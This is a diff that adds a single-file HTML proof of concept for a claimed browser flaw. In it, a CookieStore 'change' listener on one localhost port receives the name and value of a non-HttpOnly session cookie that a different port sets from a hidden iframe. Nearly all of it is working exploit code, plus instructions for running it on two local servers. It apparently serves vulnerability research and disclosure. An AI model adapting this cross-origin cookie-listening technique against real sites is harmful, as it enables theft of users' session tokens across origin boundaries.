@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<!--
+  CookieStore CROSS-PORT 'change' EVENT — single-file self-demonstrating PoC
+  =========================================================================
+  Bug (CLAIMED, confirmed): a document at http://host:PORT_A/ that calls
+    cookieStore.addEventListener('change', ...) receives the NAME + VALUE of a
+    non-HttpOnly cookie set by the DIFFERENT Web Origin http://host:PORT_B/,
+    in real time, with no polling.  Port is part of the Web Origin; the event
+    should be port-scoped and is not.
+
+  This is NOT the getAll() read (that is non-novel / not claimed). This file
+  attaches the listener FIRST, then a cross-port cookie is set, and the event
+  fires — proving the push event, not a snapshot read.
+
+  WHY NOT JUST DOUBLE-CLICK?  A cross-PORT bug needs two HTTP origins on two
+  ports. file:// has no port and no cookieStore. So serve this one file on two
+  ports (same directory), then open the ATTACKER url. The page loads the VICTIM
+  origin itself in an iframe and drives the whole demo automatically.
+
+  ----  RUN (one directory, two ports)  ----------------------------------
+    # terminal 1
+    python3 -m http.server 9101
+    # terminal 2  (same folder)
+    python3 -m http.server 9102
+    # then open in Chrome (or Firefox):
+    http://localhost:9101/cookiestore_xport_poc.html
+  ------------------------------------------------------------------------
+-->
+<html lang="en">
+<meta charset="utf-8">
+<title>CookieStore cross-port 'change' event PoC</title>
+<style>
+  body{font:13px/1.5 ui-monospace,Menlo,monospace;background:#0b0b0b;color:#cfcfcf;margin:18px;max-width:880px}
+  h1{color:#ff5252;font-size:15px;margin:0 0 4px}
+  h2{color:#5cc8ff;font-size:13px;margin:14px 0 4px}
+  .role{display:inline-block;padding:2px 8px;border:1px solid #444;border-radius:3px;color:#ffd24d}
+  #log{background:#070707;border:1px solid #222;padding:10px;white-space:pre-wrap;min-height:120px}
+  .leak{color:#ff5252;font-weight:bold}
+  .ok{color:#4ade80}.dim{color:#777}.hdr{color:#5cc8ff}
+  code{color:#ffd24d}
+  iframe{display:none}
+  .banner{padding:8px;border:1px solid #333;background:#101010;margin:8px 0}
+</style>
+<body>
+<script>
+// ── Role detection ──────────────────────────────────────────────────────────
+// The SAME file plays two roles depending on its port / query string:
+//   * ATTACKER (the port you open, e.g. :9101): attaches the change listener.
+//   * VICTIM  (loaded in a hidden iframe at the sibling port, e.g. :9102):
+//             sets a non-HttpOnly cookie via cookieStore.set().
+const params   = new URLSearchParams(location.search);
+const isVictim = params.get('role') === 'victim';
+
+// Attacker derives the victim origin = same host, port+1 (so :9101 -> :9102).
+function siblingOrigin() {
+  const m = location.origin.match(/^(https?:\/\/[^:]+):(\d+)$/);
+  if (!m) return null;
+  return `${m[1]}:${parseInt(m[2], 10) + 1}`;
+}
+
+// ── VICTIM ROLE ─────────────────────────────────────────────────────────────
+if (isVictim) {
+  document.body.innerHTML = '<p class="dim">victim origin — setting a cookie…</p>';
+  (async () => {
+    try {
+      if (typeof cookieStore === 'undefined') {
+        parent.postMessage({ t: 'victim-error', m: 'cookieStore unavailable' }, '*');
+        return;
+      }
+      const value = 'SESSTOKEN_' + Math.random().toString(36).slice(2, 12).toUpperCase();
+      // Non-HttpOnly cookie (HttpOnly is correctly excluded from this vector).
+      await cookieStore.set({ name: 'victim_session', value, path: '/', sameSite: 'lax' });
+      parent.postMessage({ t: 'victim-set', name: 'victim_session', value, origin: location.origin }, '*');
+    } catch (e) {
+      parent.postMessage({ t: 'victim-error', m: String(e) }, '*');
+    }
+  })();
+
+} else {
+// ── ATTACKER ROLE ───────────────────────────────────────────────────────────
+  const victim = siblingOrigin();
+  document.body.insertAdjacentHTML('beforeend', `
+    <h1>CookieStore cross-port 'change' event — live PoC</h1>
+    <div class="banner">
+      <span class="role">ATTACKER</span> ${location.origin}
+      &nbsp;→&nbsp; <span class="role">VICTIM</span> ${victim || '(serve on a port!)'}
+    </div>
+    <p class="dim">The attacker page attaches <code>cookieStore.addEventListener('change')</code>,
+    then asks the victim origin (hidden iframe) to set a cookie. If the event fires here with the
+    victim's cookie value, the change event crossed the port boundary.</p>
+    <h2>Event log</h2>
+    <div id="log"></div>
+  `);
+
+  const log = document.getElementById('log');
+  const L = (m, c = '') => { log.innerHTML += `<span class="${c}">${m}\n</span>`; };
+  const hex = s => s;
+
+  (async () => {
+    if (typeof cookieStore === 'undefined') {
+      L('[ERROR] cookieStore API not available. Use Chrome 87+ / Firefox 101+.', 'leak'); return;
+    }
+    if (!victim) {
+      L('[SETUP] This file is not served on a port (origin = ' + location.origin + ').', 'leak');
+      L('        Serve it on TWO ports and open the lower one. See the comment at top of this file.', 'dim');
+      return;
+    }
+
+    // 1) Attach the listener BEFORE any cross-port cookie is set.
+    let fired = false;
+    cookieStore.addEventListener('change', e => {
+      for (const c of (e.changed || [])) {
+        const cross = true; // any cookie delivered here that we did not set ourselves
+        L(`  CHANGE EVENT  name='${c.name}'  value='${c.value}'`, 'leak');
+        if (c.name === 'victim_session') {
+          fired = true;
+          L('', '');
+          L('  ✓ CONFIRMED: the change event for a cookie set by ' + victim, 'ok');
+          L('    fired in this ' + location.origin + ' document — across the port boundary.', 'ok');
+          L('    (listener was attached first → this is the push event, not a getAll snapshot.)', 'dim');
+        }
+      }
+    });
+    L('[1] Listener attached at ' + location.origin + ' via cookieStore.addEventListener(\'change\')', 'hdr');
+
+    // 2) Ask the victim origin (iframe) to set its cookie.
+    window.addEventListener('message', ev => {
+      if (ev.data && ev.data.t === 'victim-set') {
+        L('[2] Victim ' + ev.data.origin + ' set cookie ' + ev.data.name + '=' + ev.data.value, 'hdr');
+        L('    …waiting for the cross-port change event on this page…', 'dim');
+        setTimeout(() => {
+          if (!fired) {
+            L('', '');
+            L('  ✗ No cross-port event observed. On this engine/build the change event may be', 'dim');
+            L('    port-scoped (the secure behaviour), or SW/event delivery differs. Try Chrome.', 'dim');
+          }
+        }, 2500);
+      } else if (ev.data && ev.data.t === 'victim-error') {
+        L('[victim error] ' + ev.data.m, 'leak');
+      }
+    });
+
+    const f = document.createElement('iframe');
+    f.src = victim + location.pathname + '?role=victim';
+    document.body.appendChild(f);
+    L('[+] Loaded victim origin in a hidden iframe: ' + f.src, 'dim');
+  })();
+}
+</script>
+</body>
+</html>
